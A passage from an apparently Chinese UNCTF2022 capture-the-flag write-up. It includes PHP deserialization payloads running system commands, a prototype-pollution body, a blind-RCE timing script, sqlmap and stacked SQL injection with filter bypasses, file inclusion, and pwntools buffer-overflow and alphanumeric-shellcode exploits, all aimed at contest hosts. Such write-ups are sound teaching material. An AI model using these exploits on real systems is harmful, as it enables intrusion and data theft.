class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezunseri"><a href="#ezunseri" class="headerlink" title="ezunseri"></a>ezunseri</h3><blockquote><p>好像还没有反序列化的题目？</p></blockquote><p>反序列化链：<code>Login:__destruct() =&gt; Exec:__get() =&gt; Test:__toString() =&gt; Exec:__invoke() =&gt; Exec:execute()</code></p><p>构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exec</span>:</span><br><span class="line">    public_content=<span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    public_test=Exec()</span><br><span class="line">    public_key=<span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exec</span>:</span><br><span class="line">    public_content=Test()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Login</span>:</span><br><span class="line">    private_name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    public_code=<span class="string">&#x27;3.1415926&#x27;</span></span><br><span class="line">    public_key=Exec()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(Login())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A5%3A%22Login%22%3A3%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># 绕__wakeup():</span></span><br><span class="line"><span class="comment"># O%3A5%3A%22Login%22%3A4%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="poppop"><a href="#poppop" class="headerlink" title="poppop"></a>poppop</h3><p>反序列化链：<code>B:__destruct() =&gt; C:__toString() =&gt; A:__call()</code></p><p>构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_code=<span class="string">&#x27;system(&quot;env&quot;);&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    private_key2=A()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_key=C()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(quote(serialize(B())))</span><br><span class="line">      </span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A1%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D</span></span><br><span class="line"><span class="comment"># 绕__wakeup():</span></span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A2%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="babynode"><a href="#babynode" class="headerlink" title="babynode"></a>babynode</h3><blockquote><p>你能污染对象吗</p></blockquote><p>原型链污染。</p><p>Payload：</p><p>POST： <code>&#123;&quot;__proto__&quot;:&#123;&quot;id&quot;:&quot;unctf&quot;&#125;&#125;</code></p><p>​    </p><h3 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy_rce"></a>easy_rce</h3><blockquote><p>rce布尔盲注</p></blockquote><p>无回显RCE，可以采用 <code>if+head+cut+sleep</code> 方式逐位猜解flag各个字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://c88b47e2-7088-4011-8d20-f4e5677e765e.node.yuzhian.com.cn/?code=&#x27;</span></span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;&#123;-&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    judge = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        now = <span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>a=$(tac /f?ag | head -1 | cut -b <span class="subst">&#123;i&#125;</span>)%0aif [ $a = <span class="subst">&#123;j&#125;</span> ]%0athen sleep 2%0afi&#x27;</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.get(now)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(end)-<span class="built_in">int</span>(start) &gt; <span class="number">1</span>:</span><br><span class="line">            judge = <span class="number">1</span></span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> judge == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><blockquote><p>好像见过，又好像不是</p></blockquote><p>sqlmap能跑出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot;</span> --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot;</span> -D ctftraining --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot;</span> -D ctftraining -T FLAG_TABLE --sql-shell</span><br><span class="line"></span><br><span class="line">sql-shell&gt; <span class="keyword">select</span> load_file(<span class="string">&quot;/flag&quot;</span>);</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ez2048"><a href="#ez2048" class="headerlink" title="ez2048"></a>ez2048</h3><p>F12在game.js内查看关键代码，为首页invite_code验证逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">checkInvited</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> args = [...<span class="variable language_">arguments</span>];</span><br><span class="line">    <span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">const</span> view = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line">    view.<span class="title function_">setUint8</span>(<span class="number">0</span>, <span class="number">68</span>);</span><br><span class="line">    view.<span class="title function_">setUint8</span>(<span class="number">1</span>, <span class="number">51</span>);</span><br><span class="line">    view.<span class="title function_">setUint8</span>(<span class="number">2</span>, <span class="number">15</span>);</span><br><span class="line">    view.<span class="title function_">setUint8</span>(<span class="number">3</span>, <span class="number">80</span>);</span><br><span class="line">    view.<span class="title function_">setUint16</span>(<span class="number">4</span>, <span class="number">0x0e5d</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint16</span>(<span class="number">6</span>, <span class="number">0x323a</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint16</span>(<span class="number">8</span>, <span class="number">0x3058</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint16</span>(<span class="number">10</span>, <span class="number">0x1a2a</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint32</span>(<span class="number">12</span>, <span class="number">0x0512160d</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint32</span>(<span class="number">16</span>, <span class="number">0x02560002</span>);</span><br><span class="line">    view.<span class="title function_">setUint32</span>(<span class="number">20</span>, <span class="number">0x130000</span>);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">code</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (code.<span class="property">length</span> !== <span class="number">24</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">let</span> encode = [];</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; code.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (~i % <span class="number">2</span> === <span class="number">0</span>) &#123;</span><br><span class="line">          encode.<span class="title function_">push</span>(code.<span class="title function_">charCodeAt</span>(i) ^ code.<span class="title function_">charCodeAt</span>(i - <span class="number">2</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          encode.<span class="title function_">push</span>(code.<span class="title function_">charCodeAt</span>(i) ^ code.<span class="title function_">charCodeAt</span>(i + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; code.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (view.<span class="title function_">getInt8</span>(i) !== encode[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!!<span class="variable language_">arguments</span>.<span class="property">length</span>) &#123;</span><br><span class="line">        [].<span class="property">push</span>.<span class="title function_">apply</span>(args, <span class="variable language_">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">check</span>(args.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>写简单脚本还原输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">68</span>,<span class="number">51</span>,<span class="number">15</span>,<span class="number">80</span>,<span class="number">93</span>,<span class="number">14</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">88</span>,<span class="number">48</span>,<span class="number">42</span>,<span class="number">26</span>,<span class="number">13</span>,<span class="number">22</span>,<span class="number">18</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">86</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">19</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c))</span><br><span class="line"></span><br><span class="line">t = [-<span class="number">1</span>]*<span class="number">24</span></span><br><span class="line">t[<span class="number">1</span>] = c[<span class="number">1</span>]</span><br><span class="line">t[<span class="number">0</span>] = t[<span class="number">1</span>]^c[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">24</span>,<span class="number">2</span>):</span><br><span class="line">  t[i] = t[i-<span class="number">2</span>]^c[i]</span><br><span class="line">  t[i-<span class="number">1</span>] = t[i]^c[i-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;w3lc0me_7o_unctf2022!!!!&#x27;</span></span><br></pre></td></tr></table></figure><p>再观察发现存在game.wasm，使用wabt工具逆wasm得到密文 <code>\x22&#125;/7v\x16\x0d&gt;GV&amp;*\x5cS@^mWS_D~V\x10\x03[3\x16^\x0eR9\x05_mG\x10\x1efalse\x00</code>，尝试与前面得到的invite_code异或，得到 <code>UNCTF&#123;hap9y_2048_game_w1th_unc7f2022~&#125;..^CW2</code>。</p><p>​    </p><h3 id="世界和平"><a href="#世界和平" class="headerlink" title="世界和平"></a>世界和平</h3><blockquote><p>提示1：堆叠注入</p></blockquote><p>根据提示进行堆叠注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0;show databases;#</span><br><span class="line">数据库名 score_mbamission/score_minnesotaunited/snert</span><br><span class="line"></span><br><span class="line">0;show tables;# </span><br><span class="line">表名 Flag/users</span><br></pre></td></tr></table></figure><p>使用 <code>0;select * from Flag</code> 查找Flag表中内容，发现无回显，猜测对 <code>select</code> 或 <code>from</code> 或 <code>Flag</code> 有过滤。</p><p>尝试 <code>0;seLseLectect version();#</code>，只用 <code>select</code> 大写+双写可以绕过得到内容，则</p><p>再用 <code>0;seLseLectect * fRfRomom FlFlagag;#</code> 即可拿到flag。</p><p>​    </p><h3 id="快乐三消"><a href="#快乐三消" class="headerlink" title="快乐三消"></a>快乐三消</h3><blockquote><p>打CTF累了来玩三消放松一下叭</p></blockquote><p>查看源码，除了进入 <code>/h5/index.php</code> 和 <code>/h4/king.php</code>，没有其他有用信息。</p><p>扫目录发现 <code>/.git/</code> 和 <code>/admin/</code>，用GitHack还原出 <code>index.php</code> 和 <code>phpinfo.php</code>，无有用信息。</p><p>用 <code>admin/unctf</code> 进入后台页面， 在网页预览功能发现url为 <code>/admin/fi.php?filename=index.php</code>，尝试发现存在文件包含漏洞，访问 <code>/admin/fi.php?filename=/flag</code> 得到flag。</p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="# Pwn"></a># Pwn</h2><h3 id="welcomeUNCTF2022"><a href="#welcomeUNCTF2022" class="headerlink" title="welcomeUNCTF2022"></a>welcomeUNCTF2022</h3><blockquote><p>easy easy easy Pwn</p></blockquote><p>签到pwn。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">37591</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;UNCTF&amp;2022\x00&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="石头剪刀布"><a href="#石头剪刀布" class="headerlink" title="石头剪刀布"></a>石头剪刀布</h3><p>伪随机数组，给了srand种子值，依照代码逻辑求出固定种子值下的100个rand值：</p><p><code>[1,1,2,2,0,2,2,1,2,2,2,2,0,0,2,1,0,1,2,0,0,1,1,1,1,2,1,1,1,0,0,2,0,1,2,0,0,1,0,2,1,2,1,2,0,1,1,1,0,0,2,0,2,1,2,1,0,0,2,2,1,1,2,1,2,2,2,2,1,0,2,0,2,0,0,1,2,2,2,0,0,1,0,1,0,0,2,0,1,0,0,2,1,1,1,1,0,1,1,2]</code></p><p>再根据石头剪刀布规则完成后半部分交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">30253</span>)</span><br><span class="line">rand = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">need = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> rand[i] == <span class="number">0</span>:</span><br><span class="line">        need.append(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> rand[i] == <span class="number">1</span>:</span><br><span class="line">        need.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> rand[i] == <span class="number">2</span>:</span><br><span class="line">        need.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;pwn later?(y/n)\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;]\x1B[0m\n&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(need[i]))</span><br><span class="line">    <span class="built_in">print</span>(i,r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>测试符合条件的数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span>    uint32;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DWORD uint32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LODWORD(x)  (*((_DWORD*)&amp;(x)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> nbytes;</span><br><span class="line"><span class="type">char</span> nptr[<span class="number">32</span>]=<span class="string">&quot; -33&quot;</span>;</span><br><span class="line">LODWORD(nbytes) = atoi(nptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,atoi(nptr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,nptr[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> ( atoi(nptr) &gt; <span class="number">32</span> || nptr[<span class="number">0</span>] == <span class="number">0x2D</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No!!Hacker&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%u&quot;</span>,(<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">39482</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name: \n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;size: \n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27; -33&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+p64(<span class="number">0x4008c3</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="int-0x80"><a href="#int-0x80" class="headerlink" title="int 0x80"></a>int 0x80</h3><blockquote><p>easy easy easy Pwn</p></blockquote><p>ret2shellcode，其中的 <code>__ctype_b_loc</code> 函数的作用可参考 <code>ctype/ctype.h</code> 源码，将输入的字符根据 </p><p><code>((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8))</code></p><p>进行处理，然后根据下面表对应的内容返回。参考 <a href="https://blog.csdn.net/yongbaoii/article/details/120446765">2021 天翼杯 pwn ezshell</a>。</p><p><img src="/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAeW9uZ2Jhb2lp,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述" style="zoom:80%;"></p><p><code>s[i] &amp; 0x4000 != 0</code> 意思即要求的输入字符是可见字符。</p><p>参考 <a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">mrctf2020_shellcode_revenge</a>，使用全可见字符shellcode输入即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">32261</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span>)</span><br><span 